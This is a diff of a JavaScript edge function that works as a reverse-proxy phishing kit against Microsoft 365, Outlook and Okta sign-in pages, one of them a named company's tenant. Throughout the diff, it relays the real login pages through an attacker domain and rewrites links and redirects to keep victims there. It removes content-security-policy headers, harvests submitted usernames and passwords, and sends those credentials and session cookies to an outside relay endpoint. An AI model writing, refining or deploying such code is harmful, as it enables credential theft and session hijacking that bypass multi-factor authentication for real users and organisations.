@@ -1,23 +1,23 @@
 export const runtime = 'edge';
 
-// ==================== DYNAMIC MULTI-UPSTREAM CONFIG ====================
+// ==================== CONFIG - SET YOUR DOMAIN HERE ====================
+const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app'; // CHANGE THIS TO YOUR ACTUAL DOMAIN
 const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
-// ADDED: www.office.com and office.com to the list
 const IDENTITY_PROVIDERS = {
   'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
   'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
   'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
   'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
   'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
-  'www.office.com': { type: 'microsoft', name: 'Office 365' },        // ADDED
-  'office.com': { type: 'microsoft', name: 'Office 365' },            // ADDED
-  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },   // ADDED
-  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },       // ADDED
-  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },    // ADDED
+  'www.office.com': { type: 'microsoft', name: 'Office 365' },
+  'office.com': { type: 'microsoft', name: 'Office 365' },
+  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
+  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
+  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
   'o.okta.com': { type: 'okta', name: 'Okta' },
   'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
   'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
@@ -89,297 +89,244 @@ async function exfiltrateCookiesFile(cookieText, ip, platform = 'unknown', url =
   } catch (e) {}
 }
 
-function getUpstreamInfo(request) {
-  const url = new URL(request.url);
-  const path = url.pathname;
-  
-  // Handle proxied requests (e.g., /_p/www.office.com/login)
-  if (path.startsWith(PROXY_PREFIX)) {
-    const withoutPrefix = path.slice(PROXY_PREFIX.length);
+// Get upstream from path or use default
+function getUpstreamInfo(pathname) {
+  if (pathname.startsWith(PROXY_PREFIX)) {
+    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
     const upstreamDomain = withoutPrefix.split('/')[0];
     const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
     
-    const provider = Object.entries(IDENTITY_PROVIDERS).find(([domain]) => domain === upstreamDomain);
-    const type = provider ? provider[1].type : 'unknown';
+    const provider = IDENTITY_PROVIDERS[upstreamDomain];
     
     return {
       upstream: upstreamDomain,
-      type: type,
+      type: provider ? provider.type : 'unknown',
       path: upstreamPath,
-      isProxied: true,
-      originalPath: path
+      isProxied: true
     };
   }
   
-  // Default to Microsoft
   return {
     upstream: INITIAL_UPSTREAM,
     type: 'microsoft',
-    path: path,
-    isProxied: false,
-    originalPath: path
+    path: pathname,
+    isProxied: false
   };
 }
 
-// CRITICAL FIX: Better redirect rewriting with explicit host detection
-function rewriteRedirect(location, currentHost) {
-  try {
-    const locUrl = new URL(location);
-    const upstreamDomain = locUrl.hostname;
+// Rewrite URL in text content (aggressive)
+function rewriteUrls(text, upstreamDomain) {
+  let result = text;
+  
+  // 1. Remove localhost references
+  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
+  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
+  
+  // 2. Rewrite all known domains to proxy paths
+  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
+    const escaped = domain.replace(/\./g, '\\.');
     
-    // Check if it's a domain we should proxy
-    const shouldProxy = IDENTITY_PROVIDERS[upstreamDomain] || 
-                       upstreamDomain.includes('microsoft') || 
-                       upstreamDomain.includes('live.com') || 
-                       upstreamDomain.includes('office.com') ||
-                       upstreamDomain.includes('msauth.net');
+    // Full URLs
+    result = result.replace(
+      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
+      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
+    );
+    result = result.replace(
+      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
+      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
+    );
+    // Protocol-relative
+    result = result.replace(
+      new RegExp(`//${escaped}(?!\\w)`, 'g'),
+      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
+    );
+  });
+  
+  // 3. Handle relative paths that should go through proxy
+  // Convert /common/... to /_p/upstream.com/common/...
+  result = result.replace(
+    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
+    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
+  );
+  
+  // 4. Fix JS hostname references
+  result = result.replace(
+    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
+    `window.location.hostname = "${YOUR_DOMAIN}"`
+  );
+  result = result.replace(
+    /document\.domain\s*=\s*["'][^"']+["']/g,
+    `document.domain = "${YOUR_DOMAIN}"`
+  );
+  
+  return result;
+}
+
+// Rewrite redirect location
+function rewriteLocation(location) {
+  try {
+    const url = new URL(location);
+    
+    // Check if we should proxy this domain
+    const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
+                       url.hostname.includes('microsoft') || 
+                       url.hostname.includes('live.com') || 
+                       url.hostname.includes('office.com') ||
+                       url.hostname.includes('msauth.net');
     
     if (shouldProxy) {
-      // Rewrite to path-based route: https://yourdomain.com/_p/www.office.com/login
-      const newPath = `${PROXY_PREFIX}${upstreamDomain}${locUrl.pathname}${locUrl.search}`;
-      
-      // CRITICAL: Ensure we use the actual domain, not localhost
-      // currentHost should be your actual domain (e.g., vercelorisdns.duck.org)
-      if (currentHost.includes('localhost') || currentHost === '127.0.0.1') {
-        // If somehow localhost, try to get from request or use fallback
-        console.error('Warning: currentHost is localhost, check deployment');
-      }
-      
-      return `https://${currentHost}${newPath}`;
+      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
     }
     
     return location;
   } catch (e) {
-    // If it's a relative URL like /login, route through current upstream
+    // Relative URL - convert to absolute through proxy
     if (location.startsWith('/')) {
-      return location; // Keep relative URLs as-is, they'll be handled by browser
+      // We'll handle this in the response by keeping it relative
+      return location;
     }
     return location;
   }
 }
 
-function rewriteBodyUrls(text, currentHost, currentUpstream) {
-  let rewritten = text;
-  
-  // 1. CRITICAL: Fix localhost references immediately
-  rewritten = rewritten.replace(/https?:\/\/localhost(:\d+)?/g, `https://${currentHost}`);
-  rewritten = rewritten.replace(/\/\/localhost(:\d+)?/g, `//${currentHost}`);
-  
-  // 2. Rewrite all known identity providers to path-based routes
-  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
-    const escaped = domain.replace(/\./g, '\\.');
-    
-    // https://domain.com/path -> https://currentHost/_p/domain.com/path
-    rewritten = rewritten.replace(
-      new RegExp(`https://${escaped}(?!\\w)`, 'g'), 
-      `https://${currentHost}${PROXY_PREFIX}${domain}`
-    );
-    
-    // http://domain.com/path -> https://currentHost/_p/domain.com/path
-    rewritten = rewritten.replace(
-      new RegExp(`http://${escaped}(?!\\w)`, 'g'), 
-      `https://${currentHost}${PROXY_PREFIX}${domain}`
-    );
-    
-    // //domain.com/path (protocol-relative)
-    rewritten = rewritten.replace(
-      new RegExp(`//${escaped}(?!\\w)`, 'g'), 
-      `//${currentHost}${PROXY_PREFIX}${domain}`
-    );
-  });
-  
-  // 3. Handle Microsoft-specific endpoints that appear as relative paths
-  // These are often in the format: /common/GetCredentialType, /Me.htm, etc.
-  rewritten = rewritten.replace(
-    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx)/g,
-    `$1https://${currentHost}${PROXY_PREFIX}${currentUpstream}/$2`
-  );
-  
-  // 4. Fix JS location/DOM references
-  rewritten = rewritten.replace(
-    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
-    `window.location.hostname = "${currentHost}"`
-  );
-  rewritten = rewritten.replace(
-    /document\.domain\s*=\s*["'][^"']+["']/g,
-    `document.domain = "${currentHost}"`
-  );
-  rewritten = rewritten.replace(
-    /window\.location\.host\s*=\s*["'][^"']+["']/g,
-    `window.location.host = "${currentHost}"`
-  );
-  
-  // 5. Handle specific Microsoft login flows
-  // Rewrite references to login.microsoftonline.com in JS strings
-  rewritten = rewritten.replace(
-    /(["'])(https?:)?\/\/login\.microsoftonline\.com([^"']*)/g,
-    `$1https://${currentHost}${PROXY_PREFIX}login.microsoftonline.com$3`
-  );
-  
-  return rewritten;
-}
-
 export default async function handleRequest(request) {
   const url = new URL(request.url);
-  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
+  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
   
-  // CRITICAL FIX: Get the actual hostname from the request
-  const currentHost = url.hostname;
-  
-  if (BLOCKED_IPS.includes(ipAddress)) {
+  if (BLOCKED_IPS.includes(ip)) {
     return new Response('Access denied.', { status: 403 });
   }
   
-  const upstreamInfo = getUpstreamInfo(request);
-  const upstreamDomain = upstreamInfo.upstream;
-  const platform = upstreamInfo.type;
-  const upstreamPath = upstreamInfo.path + url.search;
-  
-  console.log(`[${platform}] Host: ${currentHost} -> Upstream: ${upstreamDomain}${upstreamPath}`);
-  
+  // Determine upstream
+  const info = getUpstreamInfo(url.pathname);
+  const upstreamDomain = info.upstream;
+  const upstreamPath = info.path + url.search;
   const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
   
-  const newHeaders = new Headers(request.headers);
-  newHeaders.delete('Host');
-  newHeaders.set('Host', upstreamDomain);
-  newHeaders.set('Referer', `https://${upstreamDomain}/`);
-  newHeaders.set('Origin', `https://${upstreamDomain}`);
+  console.log(`[${info.type}] ${request.method} ${YOUR_DOMAIN}${url.pathname} -> ${upstreamUrl}`);
   
-  // Credential harvesting
+  // Prepare headers
+  const headers = new Headers(request.headers);
+  headers.set('Host', upstreamDomain);
+  headers.set('Referer', `https://${upstreamDomain}/`);
+  headers.set('Origin', `https://${upstreamDomain}`);
+  headers.delete('x-forwarded-host'); // Clean up to avoid confusion
+  
+  // Harvest credentials on POST
   if (request.method === 'POST') {
     try {
-      const cloned = request.clone();
-      const contentType = cloned.headers.get('content-type') || '';
-      let bodyData = {};
+      const clone = request.clone();
+      const ct = clone.headers.get('content-type') || '';
+      let data = {};
       
-      if (contentType.includes('application/json')) {
-        bodyData = await cloned.json();
+      if (ct.includes('json')) {
+        data = await clone.json();
       } else {
-        const body = await cloned.text();
+        const body = await clone.text();
         const params = new URLSearchParams(body);
-        params.forEach((v, k) => { bodyData[k] = v; });
+        params.forEach((v, k) => data[k] = v);
       }
       
-      const patterns = CREDENTIAL_PATTERNS[platform] || CREDENTIAL_PATTERNS.microsoft;
-      let creds = { ip: ipAddress, platform, upstream: upstreamDomain, url: request.url };
+      const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
+      const creds = { ip, platform: info.type, upstream: upstreamDomain, url: request.url };
       let found = false;
       
-      for (const [key, value] of Object.entries(bodyData)) {
-        if (!value) continue;
-        const lowerKey = key.toLowerCase();
+      for (const [key, val] of Object.entries(data)) {
+        if (!val) continue;
+        const low = key.toLowerCase();
         
-        patterns.username.forEach(p => {
-          if (lowerKey.includes(p.toLowerCase())) {
-            creds.username = value;
-            found = true;
-          }
-        });
-        
-        patterns.password.forEach(p => {
-          if (lowerKey.includes(p.toLowerCase())) {
-            creds.password = value;
-            found = true;
-          }
-        });
+        if (patterns.username.some(p => low.includes(p.toLowerCase()))) {
+          creds.username = val;
+          found = true;
+        }
+        if (patterns.password.some(p => low.includes(p.toLowerCase()))) {
+          creds.password = val;
+          found = true;
+        }
       }
       
       if (found && creds.username) {
         await sendToVercel('credentials', creds);
-        console.log(`[${platform}] Captured:`, creds.username);
       }
     } catch (e) {
-      console.error('Cred harvest error:', e);
+      console.error('Harvest error:', e);
     }
   }
   
   try {
-    const fetchOptions = {
+    const fetchOpts = {
       method: request.method,
-      headers: newHeaders,
-      redirect: 'manual' // Handle redirects manually to rewrite them
+      headers,
+      redirect: 'manual'
     };
     
     if (!['GET', 'HEAD'].includes(request.method)) {
-      fetchOptions.body = request.body;
-      fetchOptions.duplex = 'half';
+      fetchOpts.body = request.body;
+      fetchOpts.duplex = 'half';
     }
     
-    const response = await fetch(upstreamUrl, fetchOptions);
+    const resp = await fetch(upstreamUrl, fetchOpts);
     
-    // CRITICAL: Handle redirects by rewriting Location header
-    if ([301, 302, 303, 307, 308].includes(response.status)) {
-      const location = response.headers.get('Location');
-      if (location) {
-        const newResponseHeaders = new Headers(response.headers);
-        const rewritten = rewriteRedirect(location, currentHost);
+    // Handle redirect - rewrite Location to stay on our domain
+    if ([301, 302, 303, 307, 308].includes(resp.status)) {
+      const loc = resp.headers.get('Location');
+      if (loc) {
+        const newHeaders = new Headers(resp.headers);
+        const newLoc = rewriteLocation(loc);
         
-        console.log(`[${platform}] Redirect: ${location} -> ${rewritten}`);
+        console.log(`[Redirect] ${loc} -> ${newLoc}`);
         
-        newResponseHeaders.set('Location', rewritten);
-        return new Response(null, { status: response.status, headers: newResponseHeaders });
+        newHeaders.set('Location', newLoc);
+        return new Response(null, { status: resp.status, headers: newHeaders });
       }
     }
     
-    if (response.headers.get('Upgrade')?.toLowerCase() === 'websocket') {
-      return response;
-    }
+    // Process response
+    const newHeaders = new Headers(resp.headers);
+    newHeaders.set('access-control-allow-origin', '*');
+    newHeaders.set('access-control-allow-credentials', 'true');
+    newHeaders.delete('content-security-policy');
+    newHeaders.delete('content-security-policy-report-only');
+    newHeaders.delete('clear-site-data');
     
-    const newResponseHeaders = new Headers(response.headers);
-    newResponseHeaders.set('access-control-allow-origin', '*');
-    newResponseHeaders.set('access-control-allow-credentials', 'true');
-    newResponseHeaders.delete('content-security-policy');
-    newResponseHeaders.delete('content-security-policy-report-only');
-    newResponseHeaders.delete('clear-site-data');
+    // Process cookies
+    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
+    let cookieStr = '';
     
-    let cookieString = '';
-    let hasAuth = false;
-    const cookies = response.headers.getSetCookie ? 
-      response.headers.getSetCookie() : 
-      [response.headers.get('Set-Cookie')].filter(Boolean);
-    
-    if (cookies.length) {
-      cookieString = cookies.join('; ');
+    if (cookies?.length) {
+      cookieStr = cookies.join('; ');
       
-      const patterns = AUTH_COOKIES[platform] || [];
-      hasAuth = patterns.some(p => {
-        if (p === '.*') return true;
-        return cookieString.toLowerCase().includes(p.toLowerCase());
-      });
+      const patterns = AUTH_COOKIES[info.type] || [];
+      const hasAuth = patterns.some(p => p === '.*' || cookieStr.toLowerCase().includes(p.toLowerCase()));
       
-      if (hasAuth || cookieString.length > 0) {
-        await exfiltrateCookiesFile(cookieString, ipAddress, platform, request.url);
+      if (hasAuth || cookieStr) {
+        await exfiltrateCookiesFile(cookieStr, ip, info.type, request.url);
       }
       
-      cookies.forEach(cookie => {
-        let modified = cookie;
-        modified = modified.replace(/Domain=[^;]+;?/gi, '');
-        newResponseHeaders.append('Set-Cookie', modified);
+      cookies.forEach(c => {
+        // Remove domain restrictions
+        const mod = c.replace(/Domain=[^;]+;?/gi, '');
+        newHeaders.append('Set-Cookie', mod);
       });
     }
     
-    const contentType = response.headers.get('content-type') || '';
-    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(contentType)) {
-      let text = await response.text();
-      text = rewriteBodyUrls(text, currentHost, upstreamDomain);
+    // Rewrite body content
+    const ct = resp.headers.get('content-type') || '';
+    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
+      let text = await resp.text();
+      text = rewriteUrls(text, upstreamDomain);
       
-      return new Response(text, {
-        status: response.status,
-        headers: newResponseHeaders
-      });
+      return new Response(text, { status: resp.status, headers: newHeaders });
     }
     
-    return new Response(response.body, {
-      status: response.status,
-      headers: newResponseHeaders
-    });
+    return new Response(resp.body, { status: resp.status, headers: newHeaders });
     
-  } catch (error) {
-    console.error(`[${platform}] Error:`, error);
+  } catch (err) {
+    console.error(`[${info.type}] Error:`, err);
     return new Response(JSON.stringify({
       error: 'Proxy Error',
-      message: error.message,
-      upstream: upstreamDomain,
-      platform
+      message: err.message,
+      upstream: upstreamDomain
     }), { status: 502, headers: { 'content-type': 'application/json' } });
   }
 }
